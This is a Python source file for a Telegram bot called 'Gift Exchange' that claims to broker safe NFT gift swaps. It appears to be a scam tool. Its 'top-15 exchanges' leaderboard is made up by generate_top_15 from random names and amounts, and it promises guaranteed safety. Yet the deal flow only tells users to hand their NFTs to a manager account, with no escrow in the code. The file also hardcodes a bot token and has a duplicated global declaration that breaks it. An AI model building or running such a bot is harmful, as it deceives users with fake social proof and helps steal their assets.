# NFT Exchange Bot для iPhone
# ФИНАЛЬНАЯ ВЕРСИЯ - БЕЗ ДУБЛЕЙ И ФЛУДА

import requests
import time
import uuid
import random
from datetime import datetime

# ===== НАСТРОЙКИ =====
TOKEN = "8487741416:AAHlISX26SKheAnTQJCv1rPHY-X0f3fWdI0"
ADMIN_ID = 174415647
SUPPORT = "GiftExchangersSupport"
MANAGER = "GiftExchangersManager"
BOT_USERNAME = "GiftExchangersBot"

# ===== ХРАНИЛИЩЕ ДАННЫХ =====
deals = {}
top_deals = []
users = {}
banned_users = set()
last_message_ids = {}  # Для защиты от дублей
user_states = {}  # Отдельно храним состояния
user_temp = {}  # Отдельно временные данные

settings = {
    "min_amount": 100,
    "max_amount": 300,
    "banner_text": "👋 Приветствуем в проекте «Gift Exchange».\n\n🤝 Наш проект создан для безопасных обменов Telegram подарков между пользователями.\n\n👇 Для взаимодействия с ботом, нажмите одну из кнопок ниже:"
}

# ===== КЛАВИАТУРЫ =====
def main_keyboard():
    return {
        "keyboard": [
            [{"text": "📝 Создать сделку"}],
            [{"text": "❓ Как происходит сделка"}, {"text": "ℹ️ Информация"}],
            [{"text": "📞 Техподдержка"}, {"text": "🏆 Топ-15 обменов"}]
        ],
        "resize_keyboard": True
    }

def admin_keyboard():
    return {
        "inline_keyboard": [
            [{"text": "📊 Статистика", "callback_data": "admin_stats"}],
            [{"text": "📢 Рассылка", "callback_data": "admin_broadcast"}],
            [{"text": "🚫 Бан", "callback_data": "admin_ban"}],
            [{"text": "✅ Разбан", "callback_data": "admin_unban"}],
            [{"text": "📝 Баннер", "callback_data": "admin_banner"}],
            [{"text": "💰 Лимиты", "callback_data": "admin_limits"}],
            [{"text": "📋 Сделки", "callback_data": "admin_deals"}],
            [{"text": "🔄 Обновить топ", "callback_data": "admin_refresh_top"}],
            [{"text": "❌ Закрыть", "callback_data": "admin_close"}]
        ]
    }

# ===== ОТПРАВКА СООБЩЕНИЙ (с защитой от дублей) =====
def send_message(chat_id, text, keyboard=None, parse_mode="HTML"):
    # Проверяем дубли
    if chat_id in last_message_ids:
        last_time, last_text = last_message_ids[chat_id]
        if time.time() - last_time < 2 and last_text == text[:50]:
            return
    
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": parse_mode
    }
    if keyboard:
        data["reply_markup"] = keyboard
    try:
        response = requests.post(url, json=data)
        if response.status_code == 200:
            last_message_ids[chat_id] = (time.time(), text[:50])
    except:
        pass

def send_inline_keyboard(chat_id, text, buttons, parse_mode="HTML"):
    if chat_id in last_message_ids:
        last_time, last_text = last_message_ids[chat_id]
        if time.time() - last_time < 2 and last_text == text[:50]:
            return
    
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    keyboard = {"inline_keyboard": buttons}
    data = {
        "chat_id": chat_id,
        "text": text,
        "reply_markup": keyboard,
        "parse_mode": parse_mode
    }
    try:
        response = requests.post(url, json=data)
        if response.status_code == 200:
            last_message_ids[chat_id] = (time.time(), text[:50])
    except:
        pass

def edit_message(chat_id, message_id, text, keyboard=None, parse_mode="HTML"):
    url = f"https://api.telegram.org/bot{TOKEN}/editMessageText"
    data = {
        "chat_id": chat_id,
        "message_id": message_id,
        "text": text,
        "parse_mode": parse_mode
    }
    if keyboard:
        data["reply_markup"] = keyboard
    try:
        requests.post(url, json=data)
    except:
        pass

# ===== ГЕНЕРАЦИЯ ТОП-15 =====
def generate_top_15():
    random_top = []
    names = ["Alice", "Bob", "Charlie", "David", "Eve", "Frank", "Grace", "Henry", "Ivy", "Jack"]
    
    for i in range(15):
        amount = random.randint(100, 400)
        user1 = random.choice(names) + str(random.randint(10, 99))
        user2 = random.choice(names) + str(random.randint(10, 99))
        random_top.append({
            'user1': f"@{user1}",
            'user2': f"@{user2}",
            'amount': amount,
            'date': datetime.now().strftime("%Y-%m-%d")
        })
    
    random_top.sort(key=lambda x: x['amount'], reverse=True)
    return random_top

# ===== ОБРАБОТКА СООБЩЕНИЙ =====
def handle_message(message):
    chat_id = message['chat']['id']
    text = message.get('text', '')
    user_id = message['from']['id']
    username = message['from'].get('username', 'NoUsername')
    first_name = message['from'].get('first_name', 'Пользователь')
    
    # Проверка на бан
    if user_id in banned_users:
        send_message(chat_id, "🚫 Вы забанены в боте!")
        return
    
    # Запоминаем пользователя
    if user_id not in users:
        users[user_id] = {
            'username': username,
            'first_name': first_name,
            'chat_id': chat_id
        }
    
    # ===== /start =====
    if text == '/start':
        send_message(chat_id, settings['banner_text'], main_keyboard())
        return
    
    # ===== Информация =====
    if text == "ℹ️ Информация":
        info_text = """
<b>📤 Наш проект создан для безопасного обмена NFT подарками среди пользователей Telegram'a.</b>

<b>➕ В чем плюсы нашего проекта?</b>
• <b>Быстрые, качественные и безопасные обмены!</b>
• <b>Техническая поддержка 24/7</b>
• <b>Гарантия безопасности каждой сделки</b>
• <b>Конфиденциальность данных</b>
• <b>Интуитивно понятный интерфейс</b>

<b>📞 Техническая поддержка:</b> @GiftExchangersManager

<b>🤝 Желаем отличных обменов!</b>
        """
        buttons = [[
            {"text": "❓ Как происходит сделка", "callback_data": "how_deal"},
            {"text": "🏠 Главное меню", "callback_data": "main_menu"}
        ]]
        send_inline_keyboard(chat_id, info_text, buttons)
        return
    
    # ===== Как происходит сделка =====
    if text == "❓ Как происходит сделка":
        deal_text = """
<b>❓ Как происходит сделка в Gift Exchange?</b>

• <b>Продавец и покупатель обговаривают условия сделки 🤝</b>

• <b>Один участник сделки создаёт сделку через меню бота - @GiftExchangersBot 🎁</b>

• <b>Второй участник сделки принимает сделку 📤</b>

• <b>После того как 2 человека присоединились к сделке, первый участник передаёт NFT менеджеру - @GiftExchangersManager 💰</b>

• <b>После передачи подарка, техподдержка моментально одобрит приход NFT</b>

• <b>Затем вторая сторона передаёт NFT</b>

• <b>Менеджер передаёт NFT первому участнику</b>

• <b>Сделка завершена успешно! ✅</b>
        """
        buttons = [[
            {"text": "🏠 Главное меню", "callback_data": "main_menu"}
        ]]
        send_inline_keyboard(chat_id, deal_text, buttons)
        return
    
    # ===== Техподдержка =====
    if text == "📞 Техподдержка":
        support_text = f"""
<b>📞 Техническая поддержка:</b>

<b>👤 Поддержка:</b> @{SUPPORT}
<b>👤 Менеджер:</b> @{MANAGER}

<b>Напишите им в личные сообщения для получения помощи!</b>
        """
        send_message(chat_id, support_text, main_keyboard())
        return
    
    # ===== Топ-15 =====
    if text == "🏆 Топ-15 обменов":
        global top_deals
        if not top_deals:
            top_deals = generate_top_15()
        
        top_text = "<b>🏆 ТОП-15 ЛУЧШИХ ОБМЕНОВ (до $400)</b>\n\n"
        for i, deal in enumerate(top_deals[:15], 1):
            top_text += f"<b>{i}. {deal['user1']} ↔ {deal['user2']} — ${deal['amount']}</b>\n"
        send_message(chat_id, top_text)
        return
    
    # ===== СОЗДАНИЕ СДЕЛКИ =====
    if text == "📝 Создать сделку":
        user_states[user_id] = 'waiting_username'
        user_temp[user_id] = {}
        send_message(chat_id, "<b>Введите @username второго участника сделки:</b>")
        return
    
    # ===== Обработка состояний =====
    if user_id in user_states:
        state = user_states[user_id]
        
        # Ожидание username
        if state == 'waiting_username':
            second_user = text.replace('@', '').strip()
            if second_user:
                user_temp[user_id]['second_user'] = second_user
                user_states[user_id] = 'waiting_my_nft'
                send_message(chat_id, "<b>Введите ссылку на ВАШУ NFT (которую отдаете):</b>")
            return
        
        # Ожидание своей NFT
        if state == 'waiting_my_nft':
            user_temp[user_id]['my_nft'] = text
            user_states[user_id] = 'waiting_his_nft'
            send_message(chat_id, "<b>Введите ссылку на ЕГО NFT (которую получаете):</b>")
            return
        
        # Ожидание его NFT
        if state == 'waiting_his_nft':
            user_temp[user_id]['his_nft'] = text
            user_states[user_id] = 'waiting_amount'
            send_message(chat_id, f"<b>Введите сумму сделки в USD (от ${settings['min_amount']} до ${settings['max_amount']}):</b>")
            return
        
        # Ожидание суммы
        if state == 'waiting_amount':
            try:
                amount = float(text.replace('$', '').replace(',', '').strip())
                
                if amount < settings['min_amount']:
                    send_message(chat_id, f"<b>❌ Минимальная сумма: ${settings['min_amount']}!</b>")
                    return
                if amount > settings['max_amount']:
                    send_message(chat_id, f"<b>❌ Максимальная сумма: ${settings['max_amount']}!</b>")
                    return
                
                # Создаем сделку
                deal_id = str(uuid.uuid4())[:8]
                second_user = user_temp[user_id]['second_user']
                my_nft = user_temp[user_id]['my_nft']
                his_nft = user_temp[user_id]['his_nft']
                
                deals[deal_id] = {
                    'creator_id': user_id,
                    'creator_name': username,
                    'second_user': second_user,
                    'my_nft': my_nft,
                    'his_nft': his_nft,
                    'amount': amount,
                    'status': 'waiting',
                    'created_at': datetime.now().strftime("%Y-%m-%d %H:%M"),
                    'participant_id': None
                }
                
                deal_text = f"""
<b>✅ СДЕЛКА СОЗДАНА!</b>

<b>🆔 Номер:</b> <code>{deal_id}</code>
<b>👤 Создатель:</b> @{username}
<b>👤 Участник:</b> @{second_user}

<b>🎁 Ваша NFT:</b> {my_nft}
<b>🎁 Его NFT:</b> {his_nft}
<b>💰 Сумма:</b> ${amount}

<b>🔗 Ссылка на сделку:</b>
https://t.me/{BOT_USERNAME}?start=deal_{deal_id}
                """
                
                buttons = [[
                    {"text": "✅ Принять сделку", "callback_data": f"accept_{deal_id}"},
                    {"text": "❌ Отменить", "callback_data": f"cancel_{deal_id}"}
                ]]
                
                send_inline_keyboard(chat_id, deal_text, buttons)
                
                # Уведомление второму участнику
                for uid, user_data in users.items():
                    if user_data.get('username') == second_user:
                        notify_text = f"""
<b>🔔 ВАС ПРИГЛАСИЛИ К ОБМЕНУ!</b>

<b>Пользователь @{username} создал сделку с вами!</b>

<b>🆔 Номер:</b> <code>{deal_id}</code>
<b>💰 Сумма:</b> ${amount}

<b>🔗 Ссылка:</b> https://t.me/{BOT_USERNAME}?start=deal_{deal_id}
                        """
                        
                        accept_buttons = [[
                            {"text": "✅ Принять сделку", "callback_data": f"accept_{deal_id}"}
                        ]]
                        
                        send_inline_keyboard(user_data['chat_id'], notify_text, accept_buttons)
                        break
                
                # Очищаем состояние
                del user_states[user_id]
                del user_temp[user_id]
                
            except ValueError:
                send_message(chat_id, "<b>❌ Введите число!</b>")
            return
    
    # ===== Обработка ссылки на сделку =====
    if text.startswith('/start deal_'):
        deal_id = text.replace('/start deal_', '')
        
        if deal_id in deals:
            deal = deals[deal_id]
            deal_info = f"""
<b>🔍 СДЕЛКА #{deal_id}</b>

<b>👤 Создатель:</b> @{deal['creator_name']}
<b>👤 Участник:</b> @{deal['second_user']}
<b>💰 Сумма:</b> ${deal['amount']}
<b>📊 Статус:</b> {deal['status']}

<b>🎁 NFT создателя:</b> {deal['my_nft']}
<b>🎁 NFT участника:</b> {deal['his_nft']}
            """
            
            if deal['status'] == 'waiting':
                buttons = [[
                    {"text": "✅ Принять сделку", "callback_data": f"accept_{deal_id}"}
                ]]
                send_inline_keyboard(chat_id, deal_info, buttons)
            else:
                send_message(chat_id, deal_info)
        else:
            send_message(chat_id, "<b>❌ Сделка не найдена!</b>", main_keyboard())
        return
    
    # ===== Админ-панель =====
    if text == '/admin' and user_id == ADMIN_ID:
        admin_text = f"""
<b>👨‍💼 ПАНЕЛЬ АДМИНИСТРАТОРА</b>

<b>📊 Сделок:</b> {len(deals)}
<b>👥 Пользователей:</b> {len(users)}
<b>🚫 Забанено:</b> {len(banned_users)}
<b>💰 Лимиты:</b> ${settings['min_amount']}-${settings['max_amount']}
        """
        send_inline_keyboard(chat_id, admin_text, admin_keyboard()['inline_keyboard'])
        return
    
    # ===== Админ: рассылка =====
    if user_id == ADMIN_ID and user_id in user_states and user_states[user_id] == 'admin_broadcast':
        del user_states[user_id]
        sent = 0
        for uid, user_data in users.items():
            if uid != ADMIN_ID:
                try:
                    send_message(user_data['chat_id'], f"<b>📢 РАССЫЛКА:</b>\n\n{text}")
                    sent += 1
                    time.sleep(0.05)
                except:
                    pass
        send_message(chat_id, f"<b>✅ Отправлено: {sent}</b>")
        return
    
    # ===== Админ: бан =====
    if user_id == ADMIN_ID and user_id in user_states and user_states[user_id] == 'admin_ban':
        del user_states[user_id]
        target = text.replace('@', '').strip()
        for uid, user_data in users.items():
            if user_data.get('username') == target or str(uid) == target:
                banned_users.add(uid)
                send_message(chat_id, f"<b>✅ @{target} забанен</b>")
                return
        send_message(chat_id, "<b>❌ Пользователь не найден</b>")
        return
    
    # ===== Админ: разбан =====
    if user_id == ADMIN_ID and user_id in user_states and user_states[user_id] == 'admin_unban':
        del user_states[user_id]
        target = text.replace('@', '').strip()
        for uid in list(banned_users):
            user_data = users.get(uid, {})
            if user_data.get('username') == target or str(uid) == target:
                banned_users.remove(uid)
                send_message(chat_id, f"<b>✅ @{target} разбанен</b>")
                return
        send_message(chat_id, "<b>❌ Пользователь не найден</b>")
        return
    
    # ===== Админ: баннер =====
    if user_id == ADMIN_ID and user_id in user_states and user_states[user_id] == 'admin_banner':
        del user_states[user_id]
        settings['banner_text'] = text
        send_message(chat_id, "<b>✅ Баннер обновлен!</b>")
        return
    
    # ===== Админ: лимиты =====
    if user_id == ADMIN_ID and user_id in user_states and user_states[user_id] == 'admin_limits':
        del user_states[user_id]
        try:
            parts = text.replace('$', '').replace(' ', '').split('-')
            if len(parts) == 2:
                min_val = int(parts[0])
                max_val = int(parts[1])
                settings['min_amount'] = min_val
                settings['max_amount'] = max_val
                send_message(chat_id, f"<b>✅ Лимиты: ${min_val}-${max_val}</b>")
            else:
                send_message(chat_id, "<b>❌ Формат: мин-макс (например 100-300)</b>")
        except:
            send_message(chat_id, "<b>❌ Ошибка</b>")
        return

# ===== ОБРАБОТКА КНОПОК =====
def handle_callback(callback):
    chat_id = callback['message']['chat']['id']
    message_id = callback['message']['message_id']
    data = callback['data']
    user_id = callback['from']['id']
    username = callback['from'].get('username', 'NoUsername')
    
    # Принять сделку
    if data.startswith('accept_'):
        deal_id = data.replace('accept_', '')
        
        if deal_id not in deals:
            edit_message(chat_id, message_id, "<b>❌ Сделка не найдена!</b>")
            return
        
        deal = deals[deal_id]
        
        if deal['status'] != 'waiting':
            edit_message(chat_id, message_id, "<b>❌ Сделка уже недоступна!</b>")
            return
        
        if user_id == deal['creator_id']:
            edit_message(chat_id, message_id, "<b>❌ Нельзя принять свою сделку!</b>")
            return
        
        if username != deal['second_user'] and f"@{username}" != f"@{deal['second_user']}":
            edit_message(chat_id, message_id, "<b>❌ Эта сделка создана для другого!</b>")
            return
        
        deal['participant_id'] = user_id
        deal['participant_name'] = username
        deal['status'] = 'in_progress'
        
        # Добавляем в топ
        global top_deals
        top_deals.append({
            'user1': f"@{deal['creator_name']}",
            'user2': f"@{username}",
            'amount': deal['amount'],
            'date': datetime.now().strftime("%Y-%m-%d")
        })
        # Сортируем и оставляем 15
        top_deals = sorted(top_deals, key=lambda x: x['amount'], reverse=True)[:15]
        
        # Уведомление создателю
        send_message(
            deal['creator_id'],
            f"<b>✅ @{username} принял сделку!</b>\n\n<b>Передайте NFT менеджеру @{MANAGER}</b>"
        )
        
        # Ответ принявшему
        edit_message(
            chat_id, 
            message_id, 
            f"<b>✅ Вы приняли сделку #{deal_id}</b>\n\n<b>Ожидайте передачи NFT менеджеру.</b>"
        )
        return
    
    # Отменить сделку
    if data.startswith('cancel_'):
        deal_id = data.replace('cancel_', '')
        if deal_id in deals and deals[deal_id]['creator_id'] == user_id:
            deals[deal_id]['status'] = 'cancelled'
            edit_message(chat_id, message_id, f"<b>❌ Сделка #{deal_id} отменена</b>")
        return
    
    # Главное меню
    if data == "main_menu":
        send_message(chat_id, settings['banner_text'], main_keyboard())
        return
    
    # Как происходит сделка
    if data == "how_deal":
        deal_text = """
<b>❓ Как происходит сделка в Gift Exchange?</b>

• <b>Продавец и покупатель обговаривают условия сделки 🤝</b>
• <b>Один участник создаёт сделку через меню бота 🎁</b>
• <b>Второй участник принимает сделку 📤</b>
• <b>Первый передаёт NFT менеджеру @GiftExchangersManager 💰</b>
• <b>Техподдержка одобряет</b>
• <b>Вторая сторона передаёт NFT</b>
• <b>Менеджер передаёт NFT первому</b>
• <b>Сделка завершена успешно! ✅</b>
        """
        send_message(chat_id, deal_text)
        return
    
    # Админ: статистика
    if data == "admin_stats" and user_id == ADMIN_ID:
        stats = f"""
<b>📊 СТАТИСТИКА</b>

<b>📌 Всего сделок:</b> {len(deals)}
<b>👥 Пользователей:</b> {len(users)}
<b>🚫 Забанено:</b> {len(banned_users)}
<b>🏆 В топ-15:</b> {len(top_deals)}
        """
        edit_message(chat_id, message_id, stats, admin_keyboard())
        return
    
    # Админ: рассылка
    if data == "admin_broadcast" and user_id == ADMIN_ID:
        user_states[user_id] = 'admin_broadcast'
        edit_message(chat_id, message_id, "<b>📢 Введите текст рассылки:</b>")
        return
    
    # Админ: бан
    if data == "admin_ban" and user_id == ADMIN_ID:
        user_states[user_id] = 'admin_ban'
        edit_message(chat_id, message_id, "<b>🚫 Введите @username для бана:</b>")
        return
    
    # Админ: разбан
    if data == "admin_unban" and user_id == ADMIN_ID:
        user_states[user_id] = 'admin_unban'
        edit_message(chat_id, message_id, "<b>✅ Введите @username для разбана:</b>")
        return
    
    # Админ: баннер
    if data == "admin_banner" and user_id == ADMIN_ID:
        user_states[user_id] = 'admin_banner'
        edit_message(chat_id, message_id, "<b>📝 Введите новый текст баннера:</b>")
        return
    
    # Админ: лимиты
    if data == "admin_limits" and user_id == ADMIN_ID:
        user_states[user_id] = 'admin_limits'
        edit_message(chat_id, message_id, f"<b>💰 Введите лимиты (мин-макс):\nТекущие: ${settings['min_amount']}-${settings['max_amount']}</b>")
        return
    
    # Админ: все сделки
    if data == "admin_deals" and user_id == ADMIN_ID:
        if not deals:
            edit_message(chat_id, message_id, "<b>📭 Нет сделок</b>", admin_keyboard())
            return
        text = "<b>📋 ВСЕ СДЕЛКИ:</b>\n\n"
        for deal_id, deal in list(deals.items())[:10]:
            status = "⏳" if deal['status'] == 'waiting' else "🔄" if deal['status'] == 'in_progress' else "✅"
            text += f"{status} <b>{deal_id}</b>: @{deal['creator_name']} → @{deal['second_user']} (${deal['amount']})\n"
        if len(deals) > 10:
            text += f"\n...и еще {len(deals) - 10} сделок"
        edit_message(chat_id, message_id, text, admin_keyboard())
        return
    
    # Админ: обновить топ
    if data == "admin_refresh_top" and user_id == ADMIN_ID:
        global top_deals
        top_deals = generate_top_15()
        text = "<b>🔄 ТОП-15 ОБНОВЛЕН:</b>\n\n"
        for i, deal in enumerate(top_deals[:15], 1):
            text += f"<b>{i}. {deal['user1']} ↔ {deal['user2']} — ${deal['amount']}</b>\n"
        edit_message(chat_id, message_id, text, admin_keyboard())
        return
    
    # Админ: закрыть
    if data == "admin_close" and user_id == ADMIN_ID:
        send_message(chat_id, settings['banner_text'], main_keyboard())
        return

# ===== ЗАПУСК =====
def main():
    print("🚀 NFT Exchange Bot запущен!")
    print(f"🤖 Бот: @{BOT_USERNAME}")
    print(f"👑 Админ ID: {ADMIN_ID}")
    
    global top_deals
    top_deals = generate_top_15()
    print(f"🏆 Сгенерирован топ-15 с {len(top_deals)} записями")
    
    offset = 0
    while True:
        try:
            url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
            response = requests.get(url, params={
                "offset": offset,
                "timeout": 30
            })
            
            if response.status_code == 200:
                data = response.json()
                if data['ok']:
                    for update in data['result']:
                        offset = update['update_id'] + 1
                        
                        if 'message' in update:
                            handle_message(update['message'])
                        elif 'callback_query' in update:
                            handle_callback(update['callback_query'])
            
            time.sleep(0.5)
            
        except KeyboardInterrupt:
            print("\n❌ Бот остановлен")
            break
        except Exception as e:
            print(f"Ошибка: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
